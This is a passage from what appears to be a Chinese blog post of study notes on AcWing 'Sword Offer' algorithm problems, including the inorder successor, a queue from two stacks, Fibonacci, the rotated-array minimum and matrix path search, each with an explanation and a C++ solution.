class="number">0</span>, pre.<span class="built_in">size</span>() - <span class="number">1</span>, <span class="number">0</span>, in.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 返回区间先序和中序遍历序列对应的子树的根</span></span><br><span class="line">  <span class="function">TreeNode* <span class="title">dfs</span><span class="params">(<span class="type">int</span> pl, <span class="type">int</span> pr, <span class="type">int</span> il, <span class="type">int</span> ir)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pl &gt; pr) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(pre[pl]);</span><br><span class="line">    <span class="type">int</span> k = pos[pre[pl]];</span><br><span class="line">    root-&gt;left = <span class="built_in">dfs</span>(pl + <span class="number">1</span>, pl + k - il, il, k - <span class="number">1</span>);</span><br><span class="line">    root-&gt;right = <span class="built_in">dfs</span>(pl + k - il + <span class="number">1</span>, pr, k + <span class="number">1</span>, ir);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二叉树的下一个节点★"><a href="https://www.acwing.com/problem/content/31/">二叉树的下一个节点★</a></h2><p>给定一棵二叉树的其中一个节点，请找出中序遍历序列的下一个节点。</p><p><strong>注意：</strong></p><ul><li>如果给定的节点是中序遍历序列的最后一个，则返回空节点;</li><li>二叉树一定不为空，且给定的节点一定不是空节点；</li></ul><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>假定二叉树是：[2, 1, 3, null, null, null, null]， 给出的是值等于2的节点。则应返回值等于3的节点。解释：该二叉树的结构如下，2的后继节点是3。  2 / \1   3</code></pre><h3 id="题解-2">题解</h3><p><strong>思路</strong></p><p>二叉树的中序遍历：<code>&#123; [左子树], 根节点, [右子树] &#125;</code></p><ul><li>情况1. 存在右儿子, 则为右子树的最左端</li><li>情况2. 不存在右儿子, 则需要沿着father域一直向上找，找到第1个是其father左儿子的节点，该节点的father就是当前节点的后继。即一直向左上找, 直到出现拐点(向右上),  那么拐点则为目标点(可从拐点角度再去理解)</li></ul><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221214121311915.png" alt="image-20221214121311915"></p><p><strong>时间复杂度</strong><br>不论往上找还是往下找，总共遍历的节点数都不大于树的高度。所以时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span> 是树的高度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode *father;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL), father(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">TreeNode* <span class="title">inorderSuccessor</span><span class="params">(TreeNode* p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;right) &#123;</span><br><span class="line">      p = p-&gt;right;</span><br><span class="line">      <span class="keyword">while</span> (p-&gt;left) p = p-&gt;left;</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;father &amp;&amp; p == p-&gt;father-&gt;right) p = p-&gt;father;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;father;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="用两个栈实现队列"><a href="https://www.acwing.com/problem/content/36/">用两个栈实现队列</a></h2><p>请用栈实现一个队列，支持如下四种操作：</p><ul><li>push(x) – 将元素x插到队尾；</li><li>pop() – 将队首的元素弹出，并返回该元素；</li><li>peek() – 返回队首元素；</li><li>empty() – 返回队列是否为空；</li></ul><p><strong>注意：</strong></p><ul><li>你只能使用栈的标准操作：<code>push to top</code>，<code>peek/pop from top</code>, <code>size</code> 和 <code>is empty</code>；</li><li>如果你选择的编程语言没有栈的标准库，你可以使用list或者deque等模拟栈的操作；</li><li>输入数据保证合法，例如，在队列为空时，不会进行<code>pop</code>或者<code>peek</code>等操作；</li></ul><p><strong>数据范围</strong></p><p>每组数据操作命令数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>MyQueue queue = new MyQueue();queue.push(1);queue.push(2);queue.peek();  // returns 1queue.pop();   // returns 1queue.empty(); // returns false</code></pre><h3 id="解法">解法</h3><blockquote><p>栈是“先进后出，后进先出”，两句话联系在一起很自然可以得出：两个栈可以实现“先进先出”。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  stack&lt;<span class="type">int</span>&gt; stk, cache;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">copy</span><span class="params">(stack&lt;<span class="type">int</span>&gt; &amp;source, stack&lt;<span class="type">int</span>&gt; &amp;dest)</span> </span>&#123;  <span class="comment">// &amp;, 否则报Segmentation Fault</span></span><br><span class="line">    <span class="keyword">while</span> (source.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      dest.<span class="built_in">push</span>(source.<span class="built_in">top</span>());</span><br><span class="line">      source.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">  <span class="built_in">MyQueue</span>() &#123;</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    stk.<span class="built_in">push</span>(x);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">copy</span>(stk, cache);</span><br><span class="line">    <span class="type">int</span> res = cache.<span class="built_in">top</span>();</span><br><span class="line">    cache.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="built_in">copy</span>(cache, stk);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Get the front element. */</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">copy</span>(stk, cache);</span><br><span class="line">    <span class="type">int</span> res = cache.<span class="built_in">top</span>();</span><br><span class="line">    <span class="built_in">copy</span>(cache, stk);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stk.<span class="built_in">empty</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue obj = MyQueue();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.peek();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="斐波那契数列"><a href="https://www.acwing.com/problem/content/19/">斐波那契数列</a></h2><p>输入一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ，求斐波那契数列的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 项。</p><p>假定从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 开始，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 项为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>39</mn></mrow><annotation encoding="application/x-tex">0 \le n \le 39</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">39</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入整数 n=5 返回 5</code></pre><h3 id="题解-O-n">题解 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">Fibonacci</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>, b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (n -- ) &#123;</span><br><span class="line">      <span class="type">int</span> c = a + b;</span><br><span class="line">      a = b, b = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="旋转数组的最小数字★"><a href="https://www.acwing.com/problem/content/20/">旋转数组的最小数字★</a></h2><p>把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。</p><p>输入一个升序的数组的一个旋转，输出旋转数组的最小元素。</p><p>例如数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{3,4,5,1,2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mclose">}</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{1,2,3,4,5\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">}</span></span></span></span> 的一个旋转，该数组的最小值为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p><p>数组可能包含重复项。</p><p><strong>注意</strong>：数组内所含元素非负，若数组大小为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，请返回 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span></span></span></span>。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>90</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,90]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">90</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：nums = [2, 2, 2, 0, 1]输出：0</code></pre><h3 id="预处理-二分-O-n">预处理 + 二分 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p><strong>思路</strong></p><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221214162729829.png" alt="image-20221214162729829"></p><p>二分本质: 一半区间满足某种性质, 而另一半区间全部不满足, 这题不能直接使用二分<br>由于重复元素的存在, 左边所有元素都&gt;=nums[0], 而右边并非所有元素都不满足(并不全严格&lt;nums[0)：末尾重复元素满足&gt;=nums[0]<br>去掉右重后, 左边严格&gt;=nums[0], 右边严格&lt;nums[0], 可用二分。</p><p><strong>时间复杂度</strong><br>二分的时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，删除最后水平一段的时间复杂度最坏是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，所以总时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">findMin</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (r &gt; <span class="number">0</span> &amp;&amp; nums[r] == nums[<span class="number">0</span>]) r--;</span><br><span class="line">    <span class="keyword">if</span> (nums[r] &gt; nums[<span class="number">0</span>]) <span class="keyword">return</span> nums[<span class="number">0</span>];  <span class="comment">// 判断是否单调</span></span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &lt; nums[<span class="number">0</span>]) &#123;  <span class="comment">// &lt;nums[0]，而非nums[mid]</span></span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[l];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="矩阵中的路径★"><a href="https://www.acwing.com/problem/content/21/">矩阵中的路径★</a></h2><p>请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。</p><p>路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。</p><p>如果一条路径经过了矩阵中的某一个格子，则之后不能再次进入这个格子。</p><p><strong>注意：</strong></p><ul><li>输入的路径不为空；</li><li>所有出现的字符均为大写英文字母；</li></ul><p><strong>数据范围</strong></p><p>矩阵中元素的总个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>900</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,900]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">900</span><span class="mclose">]</span></span></span></span>。<br>路径字符串的总长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>900</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,900]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">900</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>matrix=[  [&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;E&quot;],  [&quot;S&quot;,&quot;F&quot;,&quot;C&quot;,&quot;S&quot;],  [&quot;A&quot;,&quot;D&quot;,&quot;E&quot;,&quot;E&quot;]]str=&quot;BCCE&quot; , return &quot;true&quot; str=&quot;ASAE&quot; , return &quot;false&quot;</code></pre><h3 id="DFS大法好-O-n-23-k">DFS大法好 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mi>k</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^23^k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></h3><p><strong>经典的DFS</strong></p><blockquote><p>自己多练练，这么简单的题目一定要写对啦！</p></blockquote><p><strong>时间复杂度分析</strong></p><p>单词起点一共有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span> 个，单词的每个字母一共有上下左右四个方向可以选择，但由于不能走回头路，所以除了单词首字母外，仅有三种选择。所以总时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo 